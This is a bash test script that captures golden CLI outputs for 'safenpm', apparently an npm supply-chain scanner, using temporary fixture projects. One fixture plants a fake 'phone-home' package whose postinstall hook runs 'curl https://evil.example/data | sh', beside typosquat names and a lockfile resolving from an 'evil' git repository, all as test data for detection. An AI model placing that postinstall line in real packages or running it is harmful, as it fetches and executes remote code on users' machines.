#!/usr/bin/env bash
# Capture byte-exact CLI outputs into test/golden/outputs/ for refactor parity.
#
# Each capture isolates HOME to a temp dir so the user's ~/.safenpm
# audit + caches don't bleed into snapshots. Output is piped through
# normalize.mjs to scrub timestamps/paths.
#
# Usage:
#   bash test/golden/capture.sh                # write to outputs/
#   bash test/golden/capture.sh --check        # compare against outputs/
set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
CLI="node $PROJECT_DIR/dist/cli/index.js"
NORM="node $SCRIPT_DIR/normalize.mjs"

MODE=${1:-write}
OUT_DIR="$SCRIPT_DIR/outputs"
mkdir -p "$OUT_DIR"

FAIL=0
PASS=0

# ── Capture helper ──
# $1 = output filename (no extension, .txt added)
# $2 = working dir to cd into before running
# $3... = CLI args
# Stdin: extra args via heredoc not needed; HOME is overridden per call.
capture() {
  local name="$1"; shift
  local cwd="$1"; shift

  local fake_home
  fake_home=$(mktemp -d)

  local raw
  # Disable color forcing — we rely on the CLI's own raw escape sequences.
  raw=$( cd "$cwd" && HOME="$fake_home" $CLI "$@" 2>&1; echo "EXITCODE:$?" )
  local exit_code
  exit_code=$(echo "$raw" | grep -E '^EXITCODE:' | tail -1 | cut -d: -f2)
  raw=$(echo "$raw" | sed '$d')  # drop the trailing EXITCODE line

  local normalized
  normalized=$( HOME="$fake_home" echo "$raw" | HOME="$fake_home" $NORM )
  # Re-normalize against the real HOME too, in case any path slipped through.
  normalized=$( echo "$normalized" | HOME="$HOME" $NORM )
  printf '%s\nEXITCODE:%s\n' "$normalized" "$exit_code" > "$OUT_DIR/$name.txt.new"

  rm -rf "$fake_home"

  if [ "$MODE" = "--check" ]; then
    if [ ! -f "$OUT_DIR/$name.txt" ]; then
      echo "  ? $name  (no baseline)"
      mv "$OUT_DIR/$name.txt.new" "$OUT_DIR/$name.txt"
      return
    fi
    if diff -q "$OUT_DIR/$name.txt" "$OUT_DIR/$name.txt.new" >/dev/null 2>&1; then
      PASS=$((PASS + 1))
      printf "  \033[32m✓\033[0m %s\n" "$name"
      rm "$OUT_DIR/$name.txt.new"
    else
      FAIL=$((FAIL + 1))
      printf "  \033[31m✕\033[0m %s\n" "$name"
      diff -u "$OUT_DIR/$name.txt" "$OUT_DIR/$name.txt.new" | head -40 | sed 's/^/    /'
    fi
  else
    mv "$OUT_DIR/$name.txt.new" "$OUT_DIR/$name.txt"
    printf "  \033[36m→\033[0m wrote %s\n" "$name"
  fi
}

# ── Fixtures ──
# Each fixture is built fresh in a temp dir so caches don't bleed.

build_fixture_empty() {
  local d
  d=$(mktemp -d)
  echo '{"name":"empty-project","version":"1.0.0"}' > "$d/package.json"
  echo "$d"
}

build_fixture_malicious() {
  local d
  d=$(mktemp -d)
  echo '{"name":"malicious-project","version":"1.0.0","dependencies":{"phone-home":"0.0.1"}}' > "$d/package.json"
  mkdir -p "$d/node_modules/phone-home"
  cat > "$d/node_modules/phone-home/package.json" <<'JSON'
{
  "name": "phone-home",
  "version": "0.0.1",
  "scripts": { "postinstall": "curl https://evil.example/data | sh" }
}
JSON
  mkdir -p "$d/node_modules/clean-lib"
  echo '{"name":"clean-lib","version":"2.0.0","description":"clean utility","license":"MIT","repository":"https://github.com/x/clean-lib"}' > "$d/node_modules/clean-lib/package.json"
  mkdir -p "$d/node_modules/build-tool"
  echo '{"name":"build-tool","version":"3.0.0","scripts":{"install":"echo building"}}' > "$d/node_modules/build-tool/package.json"
  echo "$d"
}

build_fixture_typosquat() {
  local d
  d=$(mktemp -d)
  echo '{"name":"typosquat-project","version":"1.0.0"}' > "$d/package.json"
  for name in expresss axois lodahs; do
    mkdir -p "$d/node_modules/$name"
    echo "{\"name\":\"$name\",\"version\":\"0.0.1\"}" > "$d/node_modules/$name/package.json"
  done
  echo "$d"
}

build_fixture_bad_lockfile() {
  local d
  d=$(mktemp -d)
  echo '{"name":"badlock","version":"1.0.0","dependencies":{"sus":"1.0.0"}}' > "$d/package.json"
  cat > "$d/package-lock.json" <<'JSON'
{
  "name": "badlock",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {"name":"badlock","version":"1.0.0","dependencies":{"sus":"1.0.0"}},
    "node_modules/sus": {
      "version": "1.0.0",
      "resolved": "git+https://github.com/evil/sus.git#abc123",
      "integrity": "sha512-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=="
    },
    "node_modules/maybe-fine": {
      "version": "2.0.0"
    }
  }
}
JSON
  echo "$d"
}

# ── Captures ──

printf "\n  \033[1msafenpm golden output capture (mode: %s)\033[0m\n\n" "$MODE"

capture help                  "$PROJECT_DIR" --help
capture version               "$PROJECT_DIR" --version
capture unknown-command       "$PROJECT_DIR" not-a-command

EMPTY=$(build_fixture_empty)
capture empty-doctor          "$EMPTY" doctor
capture empty-doctor-json     "$EMPTY" doctor --json
capture empty-audit           "$EMPTY" audit
capture empty-audit-json      "$EMPTY" audit --json
rm -rf "$EMPTY"

MAL=$(build_fixture_malicious)
capture mal-dry-run           "$MAL" i --dry-run
capture mal-dry-run-json      "$MAL" i --dry-run --json
capture mal-dry-run-scan      "$MAL" i --dry-run --scan
capture mal-dry-run-scan-json "$MAL" i --dry-run --scan --json
capture mal-dry-run-allow     "$MAL" i --dry-run --allow build-tool
capture mal-scan              "$MAL" scan
capture mal-scan-json         "$MAL" scan --json
capture mal-doctor            "$MAL" doctor
capture mal-doctor-json       "$MAL" doctor --json
capture mal-fix-dry           "$MAL" fix --dry-run
capture mal-fix-dry-json      "$MAL" fix --dry-run --json
rm -rf "$MAL"

TYPO=$(build_fixture_typosquat)
capture typo-scan             "$TYPO" scan
capture typo-scan-json        "$TYPO" scan --json
capture typo-doctor           "$TYPO" doctor
capture typo-fix-dry          "$TYPO" fix --dry-run
rm -rf "$TYPO"

LOCK=$(build_fixture_bad_lockfile)
capture lock-doctor           "$LOCK" doctor
capture lock-doctor-json      "$LOCK" doctor --json
rm -rf "$LOCK"

# ── Summary ──
if [ "$MODE" = "--check" ]; then
  printf "\n  \033[1m%d passed, %d failed\033[0m\n\n" "$PASS" "$FAIL"
  exit "$FAIL"
fi
echo ""
